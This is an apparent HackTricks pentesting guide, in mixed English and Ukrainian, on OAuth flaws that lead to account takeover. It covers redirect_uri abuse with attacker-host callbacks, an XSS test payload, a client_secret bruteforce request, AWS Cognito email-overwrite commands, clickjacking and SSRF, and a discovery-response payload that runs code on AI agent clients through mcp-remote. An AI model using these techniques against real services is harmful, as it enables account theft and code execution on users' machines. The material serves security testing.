# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Основна інформація <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **authorization framework that enables an application to access or perform actions on a user's account in another application** (the authorization server).

Consider a hypothetical website _**https://example.com**_, designed to **showcase all your social media posts**, including private ones. To achieve this, OAuth 2.0 is employed. _https://example.com_ will request your permission to **access your social media posts**. Consequently, a consent screen will appear on _https://socialmedia.com_, outlining the **permissions being requested and the developer making the request**. Upon your authorization, _https://example.com_ gains the ability to **access your posts on your behalf**.

It's essential to grasp the following components within the OAuth 2.0 framework:

- **власник ресурсу (resource owner)**: Ви, як **користувач/суб'єкт**, надаєте дозвіл на доступ до вашого ресурсу, наприклад дописів у соцмережі.
- **ресурсний сервер (resource server)**: Сервер, що обробляє автентифіковані запити після того, як додаток отримав `access token` від імені `resource owner`, наприклад **https://socialmedia.com**.
- **клієнтський додаток (client application)**: Додаток, який шукає авторизацію від `resource owner`, наприклад **https://example.com**.
- **сервер авторизації (authorization server)**: Сервер, що видає `access tokens` клієнтському додатку після успішної автентифікації `resource owner` та отримання дозволу, наприклад **https://socialmedia.com**.
- **`client_id`**: Публічний, унікальний ідентифікатор для додатка.
- **`client_secret`**: Конфіденційний ключ, відомий лише додатку та authorization server, використовується для отримання `access_tokens`.
- **`response_type`**: Значення, що вказує **тип токена, який запитується**, наприклад `code`.
- **`scope`**: Рівень доступу, який `client application` запитує у `resource owner`.
- **`redirect_uri`**: URL, на який користувача перенаправляють після авторизації. Зазвичай має відповідати попередньо зареєстрованому redirect URL.
- **`state`**: Параметр для **збереження даних під час перенаправлення користувача до та від authorization server**. Його унікальність критична як механізм захисту від CSRF.
- **`grant_type`**: Параметр, що вказує **тип гранту і тип токена, який буде повернутий**.
- **`code`**: Код авторизації від authorization server, який клієнтський додаток використовує разом з `client_id` і `client_secret` для отримання `access_token`.
- **`access_token`**: Токен, який client application використовує для API-запитів від імені `resource owner`.
- **`refresh_token`**: Дозволяє додатку **отримати новий `access_token` без повторного запиту до користувача**.

### Потік

The **actual OAuth flow** proceeds as follows:

1. You navigate to [https://example.com](https://example.com) and select the “Integrate with Social Media” button.
2. The site then sends a request to [https://socialmedia.com](https://socialmedia.com) asking for your authorization to let https://example.com’s application access your posts. The request is structured as:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Вам потім показується сторінка згоди.
4. Після вашого підтвердження Social Media надсилає відповідь на `redirect_uri` з параметрами `code` та `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com використовує цей `code`, разом зі своїми `client_id` та `client_secret`, щоб зробити серверний запит для отримання `access_token` від вашого імені, надаючи доступ до дозволів, на які ви дали згоду:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Нарешті, процес завершується, коли https://example.com використовує ваш `access_token` для виконання API-запиту до соцмережі для доступу

## Уразливості <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. Будь-яка слабкість тут дозволяє зловмисникові змусити жертву перейти за шкідливим authorization URL так, що IdP доставляє жертвин `code` (і `state`) прямо на endpoint зловмисника, який потім може його викупити та зібрати токени.

Типовий сценарій атаки:

1. Сформуйте `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` і надішліть його жертві.
2. Жертва автентифікується і схвалює scopes.
3. IdP перенаправляє на `attacker.tld/callback?code=<victim-code>&state=...`, де зловмисник логірує запит і негайно обмінює code.

Поширені помилки валідації для перевірки:

- **No validation** – будь-який абсолютний URL приймається, що призводить до миттєвого викрадення code.
- **Weak substring/regex checks on the host** – обхід за допомогою подібних доменів, таких як `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, або `match.com@evil.com`.
- **IDN homograph mismatches** – валідація відбувається для punycode форми (`xn--`), але браузер перенаправляє на Unicode-домен, контрольований зловмисником.
- **Arbitrary paths on an allowed host** – pointing `redirect_uri` to `/openredirect?next=https://attacker.tld` or any XSS/user-content endpoint leaks the code either through chained redirects, Referer headers, or injected JavaScript.
- **Directory constraints without normalization** – шаблони на кшталт `/oauth/*` можна обійти за допомогою `/oauth/../anything`.
- **Wildcard subdomains** – прийняття `*.example.com` означає, що будь-яке takeover (dangling DNS, S3 bucket, etc.) одразу дає валідний callback.
- **Non-HTTPS callbacks** – пропуск `http://` URI дає мережевим зловмисникам (Wi-Fi, corporate proxy) можливість перехопити code під час передачі.

Також перегляньте допоміжні redirect-style параметри (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) та OpenID discovery документ (`/.well-known/openid-configuration`) на предмет додаткових endpoint-ів, які можуть успадкувати ті ж самі помилки валідації.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

As mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates, being **vulnerable to XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Неправильна обробка параметра `state` <a href="#bda5" id="bda5"></a>

Параметр `state` — це Authorization Code flow CSRF-токен: клієнт має згенерувати **криптографічно випадкове значення для кожного екземпляра браузера**, зберегти його в місці, до якого має доступ лише цей браузер (cookie, local storage тощо), відправити його у запиті авторизації та відхилити будь-яку відповідь, що не повертає те саме значення. Якщо значення статичне, передбачуване, необов’язкове або не пов’язане з сесією користувача, атакуючий може завершити власний OAuth-потік, перехопити фінальний запит `?code=` (не відправляючи його) і пізніше змусити браузер жертви відтворити цей запит, внаслідок чого акаунт жертви буде прив’язано до профілю атакуючого в IdP.

Шаблон відтворення завжди однаковий:

1. Атакуючий автентифікується в IdP зі своїм акаунтом та перехоплює останній редирект, що містить `code` (та будь-який `state`).
2. Вони відкидають цей запит, зберігають URL і пізніше зловживають будь-яким CSRF-примітивом (link, iframe, auto-submitting form), щоб змусити браузер жертви його завантажити.
3. Якщо клієнт не перевіряє `state`, застосунок споживає авторизаційний результат атакуючого і входить атакуючого в акаунт застосунку жертви.

Практичний чекліст щодо обробки `state` під час тестування:

- **Missing `state` entirely** – якщо параметр ніколи не з’являється, весь вхід вразливий до CSRF.
- **`state` not required** – видаліть його з початкового запиту; якщо IdP все ще видає коди, які клієнт приймає, захист реалізовано як opt-in.
- **Returned `state` not validated** – маніпулюйте значенням у відповіді (Burp, MITM proxy). Прийняття невідповідних значень означає, що збережений токен ніколи не порівнюється.
- **Predictable or purely data-driven `state`** – багато застосунків кладуть redirect paths або JSON-блоки у `state` без додавання випадковості, що дозволяє атакуючим вгадувати валідні значення та відтворювати потоки. Завжди додавайте сильну ентропію спереду/ззаду перед кодуванням даних.
- **`state` fixation** – якщо застосунок дозволяє користувачам вказувати значення `state` (наприклад, через спеціально створені authorization URLs) і повторно використовує його протягом потоку, атакуючий може зафіксувати відоме значення і повторно використовувати його для багатьох жертв.

PKCE може доповнювати `state` (особливо для public clients), прив’язуючи authorization code до code verifier, але web-клієнти все одно мають відстежувати `state`, щоб запобігти міжкористувацьким CSRF/помилкам прив’язки акаунтів.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Атакуючі можуть заздалегідь створити акаунт, використовуючи електронну адресу жертви. Якщо жертва пізніше використовує сторонній сервіс для входу, застосунок може ненавмисно зв’язати цей сторонній акаунт з передствореним акаунтом атакуючого, що призведе до несанкціонованого доступу.
2. **Exploiting Lax OAuth Email Verification**: Атакуючі можуть зловживати OAuth-сервісами, які не перевіряють email, реєструючись у них, а потім змінюючи email акаунту на адресу жертви. Цей метод аналогічно створює ризик несанкціонованого доступу до акаунту, подібно до першого сценарію, але через інший вектор атаки.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- Розпакувати APK/IPA, desktop installer або Electron app і виконати grep для пошуку `client_secret`, Base64-блоків, які декодуються в JSON, або жорстко вбудованих OAuth endpoints.
- Переглянути вбудовані конфігураційні файли (plist, JSON, XML) або декомпільовані рядки в пошуках облікових даних клієнта.

Once the attacker extracts the secret they only need to steal any victim authorization `code` (via a weak `redirect_uri`, logs, etc.) to independently hit `/token` and mint access/refresh tokens without involving the legitimate app. Treat public/native clients as **incapable of holding secrets**—they should instead rely on PKCE (RFC 7636) to prove possession of a per-instance `code_verifier` instead of a static secret. During testing, confirm whether PKCE is mandatory and whether the backend actually rejects token exchanges that omit either the `client_secret` **or** a valid `code_verifier`.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.


### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts. Test for weak binding by:

- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.

Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Перегляньте цю публікацію**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **захопити** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Для докладнішої інформації про те, як зловживати AWS Cognito, перегляньте [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Як [**згадано в цьому розслідуванні**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows, які очікують отримати **token** (а не code), можуть бути вразливими, якщо вони не перевіряють, чи належить token саме цьому додатку.

Це тому, що **зловмисник** може створити **додаток, який підтримує OAuth і логін через Facebook** (наприклад) у власному додатку. Потім, коли жертва увійде через Facebook у **додатку зловмисника**, зловмисник може отримати **OAuth token користувача, виданий його додатку, і використати його для входу в OAuth-додаток жертви, використовуючи token користувача-жертви**.

> [!CAUTION]
> Тому, якщо зловмиснику вдасться змусити користувача надати доступ до власного OAuth-додатку, він зможе захопити акаунт жертви в додатках, які очікують token і не перевіряють, чи був token виданий їхньому app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Згідно з [**цим описом**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), було можливо змусити жертву відкрити сторінку з параметром **returnUrl**, що вказував на хост зловмисника. Ця інформація зберігалася в cookie (RU) і на **наступному кроці** prompt буде **питати** користувача, чи хоче він надати доступ цьому хосту.

Щоб обійти цей prompt, можна відкрити вкладку щоб ініціювати **Oauth flow**, яка встановить цей RU cookie, використовуючи **returnUrl**, закрити вкладку до появи prompt і відкрити нову вкладку без цього значення. Тоді **prompt не повідомлятиме про хост зловмисника**, але cookie залишиться встановленим, тож **token буде відправлений на хост зловмисника** під час редиректу.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Як пояснюється в [**цьому відео**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), деякі імплементації OAuth дозволяють вказати GET-параметр **`prompt`** як None (**`&prompt=none`**) щоб **не просити користувачів підтверджувати** доступ у веб‑промпті, якщо вони вже залогінені на платформі.

### response_mode

Як [**пояснюється в цьому відео**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), інколи можна вказати параметр **`response_mode`**, щоб визначити місце, куди буде поміщено code у фінальному URL:

- `response_mode=query` -> Code надається всередині GET-параметра: `?code=2397rf3gu93f`
- `response_mode=fragment` -> Code надається всередині фрагмента URL: `#code=2397rf3gu93f`
- `response_mode=form_post` -> Code надається в POST-формі як input з ім'ям `code` і відповідним значенням
- `response_mode=web_message` -> Code відправляється через postMessage: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login діалоги — ідеальні цілі для Clickjacking: якщо сторінки можна помістити в iframe, зловмисник може накласти свої графічні елементи, приховати реальні кнопки та обманом змусити користувачів схвалити небезпечні scope або зв’язати акаунти. Робіть PoC, що:

1. Завантажує URL авторизації IdP всередині `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Використовує абсолютне позиціонування/маніпуляції opacity, щоб вирівняти фейкові кнопки з прихованими елементами **Allow**/**Approve**.
3. За бажанням попередньо заповнює параметри (scopes, redirect URI), щоб викрадена згода негайно принесла користь зловмисникові.

Під час тестування перевірте, чи сторінки IdP видають `X-Frame-Options: DENY/SAMEORIGIN` або жорстку `Content-Security-Policy: frame-ancestors 'none'`. Якщо нічого з цього немає, продемонструйте ризик за допомогою інструментів на кшталт [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) і зафіксуйте, як легко жертва авторизує додаток зловмисника. Для додаткових ідей щодо payload див. [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Згідно з [**цією публікацією**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), це OAuth flow, який дозволяє увійти через **username** і **password**. Якщо під час цього простого потоку повертається **token** з доступом до всіх дій користувача, то можна обійти 2FA, використовуючи цей token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Цей [**блогпост**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) описує, як можна було зловживати **open redirect**, беручи значення з **referrer**, щоб перевести OAuth в ATO. Атака виглядала так:

1. Жертва заходить на веб-сторінку зловмисника.
2. Жертва відкриває зловмисне посилання, і opener стартує Google OAuth flow з `response_type=id_token,code&prompt=none` як додаткові параметри, використовуючи в якості **referrer сайт зловмисника**.
3. В opener, після того як провайдер авторизує жертву, він повертає її на значення `redirect_uri` (веб жертви) з 30X кодом, який все ще зберігає сайт зловмисника в referer.
4. Веб-сайт жертви **тригерить open redirect на основі referrer**, перенаправляючи користувача до сайту зловмисника; оскільки **`response_type`** був **`id_token,code`**, code буде відправлено зловмиснику у фрагменті URL, що дозволить йому захопити акаунт користувача через Google на сайті жертви.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Перегляньте це дослідження**](https://portswigger.net/research/hidden-oauth-attack-vectors) **для детальнішого опису цієї техніки.**

Dynamic Client Registration в OAuth є менш очевидним, але критичним вектором для вразливостей, зокрема для **Server-Side Request Forgery (SSRF)**. Цей endpoint дозволяє OAuth-серверам отримувати деталі про client-додатки, включаючи чутливі URL, які можуть бути використані для експлуатації.

Ключові моменти:

- **Dynamic Client Registration** зазвичай відповідає на `/register` і приймає деталі як `client_name`, `client_secret`, `redirect_uris`, а також URL для логотипів або JSON Web Key Sets (JWKs) через POST-запити.
- Ця функція відповідає специфікаціям у **RFC7591** та **OpenID Connect Registration 1.0**, які включають параметри, потенційно вразливі до SSRF.
- Процес реєстрації може ненавмисно відкрити сервери для SSRF кількома шляхами:
- **`logo_uri`**: URL логотипа клієнта, який сервер може завантажувати, спричиняючи SSRF або XSS, якщо URL обробляється неправильно.
- **`jwks_uri`**: URL до JWK документа клієнта, який при зловмисному формуванні може спричинити, що сервер зробить вихідні запити на сервер, контрольований атакуючим.
- **`sector_identifier_uri`**: посилання на JSON-масив `redirect_uris`, який сервер може запитати, створюючи вікно для SSRF.
- **`request_uris`**: перелік дозволених request URI для клієнта, які можуть бути використані, якщо сервер перевіряє ці URI на початку authorization процесу.

Стратегія експлуатації:

- SSRF можна спровокувати, зареєструвавши нового клієнта з зловмисними URL у параметрах на кшталт `logo_uri`, `jwks_uri` або `sector_identifier_uri`.
- Хоча пряма експлуатація через `request_uris` може бути пом’якшена контролем білого списку, надання заздалегідь зареєстрованого, контрольованого атакуючим `request_uri` може сприяти SSRF під час фази авторизації.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Дослідження по [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (яке впливає на `mcp-remote` клієнти, такі як Claude Desktop, Cursor або Windsurf) показує, як **динамічний OAuth discovery стає примітивом RCE**, коли клієнт передає метадані IdP безпосередньо операційній системі. Віддалений MCP сервер повертає зловмисно контрольований `authorization_endpoint` під час discovery обміну (`/.well-known/openid-configuration` або будь‑якого metadata RPC). `mcp-remote ≤0.1.15` потім викликає системний URL handler (`start`, `open`, `xdg-open` тощо) з тим рядком, що надійшов, тому будь-яка схема/шлях, підтримувані ОС, виконуються локально.

Атакувальний робочий процес

1. Вказати desktop agent на ворожий MCP/OAuth сервер (`npx mcp-remote https://evil`). Агент отримує 401 і метадані.
2. Сервер відповідає JSON, наприклад:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Клієнт запускає OS handler для наданого URI. Windows приймає payloads на кшталт `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux приймають `file:///Applications/Calculator.app/...` або навіть кастомні схеми, такі як `cmd://bash -lc '<payload>'`, якщо вони зареєстровані.
4. Оскільки це відбувається до будь-якої взаємодії з користувачем, **достатньо просто налаштувати клієнт на спілкування з attacker server, щоб отримати виконання коду**.

**How to test**

- Націльтеся на будь-який OAuth-capable desktop/agent, який виконує discovery через HTTP(S) і відкриває повернені endpoints локально (Electron apps, CLI helpers, thick clients).
- Перехопіть або розмістіть discovery response і замініть `authorization_endpoint`, `device_authorization_endpoint` або подібні поля на `file://`, `cmd://`, UNC paths або інші небезпечні схеми.
- Спостерігайте, чи валідовує клієнт scheme/host. Відсутність валідації призводить до негайного виконання під контекстом користувача і підтверджує проблему.
- Повторіть з різними схемами, щоб змепити всю attack surface (наприклад, `ms-excel:`, `data:text/html,`, custom protocol handlers) і показати кросплатформенний охоп.

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

В OAuth поле sub унікально ідентифікує користувача, але його формат варіюється в залежності від Authorization Server. Щоб стандартизувати ідентифікацію користувачів, деякі клієнти використовують email або user handles. Проте це ризиковано, тому що:

- Деякі Authorization Servers не гарантують, що ці властивості (наприклад, email) залишаються immutable.
- У певних реалізаціях — таких як **"Login with Microsoft"** — клієнт покладається на поле email, яке є **контрольованим користувачем в Entra ID** і не перевіряється.
- Атакувальник може експлуатувати це, створивши власну Azure AD організацію (наприклад, doyensectestorg) і використовуючи її для виконання Microsoft login.
- Хоча Object ID (збережений у sub) є immutable і безпечним, покладання на змінний email може дозволити takeover акаунту (наприклад, перехоплення акаунту на кшталт victim@gmail.com).

## Client Confusion Attack

У випадку Client Confusion Attack, додаток, який використовує OAuth Implicit Flow, не перевіряє, що фінальний access token був згенерований саме для його власного Client ID. Атакувальник створює публічний вебсайт, який використовує Google’s OAuth Implicit Flow, вводячи в оману тисячі користувачів, щоб вони залогінились і тим самим зібрали access tokens, призначені для attacker’s site. Якщо ці користувачі також мають акаунти на іншому вразливому сайті, який не валідовує Client ID токена, атакувальник може повторно використати зібрані токени, щоб вдавати жертв і захопити їх акаунти.

## Scope Upgrade Attack

Authorization Code Grant передбачає secure server-to-server комунікацію для передачі даних користувача. Проте, якщо Authorization Server імпліцитно довіряє параметру scope в Access Token Request (параметру, не визначеному в RFC), зловмисний додаток може підвищити privileges authorization code, запитавши вищий scope. Після генерації Access Token, Resource Server має його перевірити: для JWT токенів це включає перевірку JWT signature і вилучення даних таких як client_id і scope, тоді як для випадкових рядкових токенів сервер має запитати Authorization Server, щоб отримати деталі токена.

## Redirect Scheme Hijacking

У mobile OAuth реалізаціях додатки використовують custom URI schemes для отримання редиректів з Authorization Codes. Однак оскільки кілька додатків можуть зареєструвати ту ж схему на пристрої, припущення, що лише легітимний клієнт контролює redirect URI, порушується. На Android, наприклад, Intent URI типу `com.example.app://` oauth ловиться на основі scheme та опціональних фільтрів, визначених в intent-filter додатку. Оскільки Android intent resolution може бути широкою — особливо якщо вказаний лише scheme — атакувальник може зареєструвати шкідливий додаток з ретельно продуманим intent filter, щоб перехопити authorization code. Це може **дозволити takeover акаунту** або через взаємодію з користувачем (коли кілька додатків відповідають на intent), або через техніки обходу, що експлуатують надто загальні фільтри, як описано у Ostorlab's assessment flowchart.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
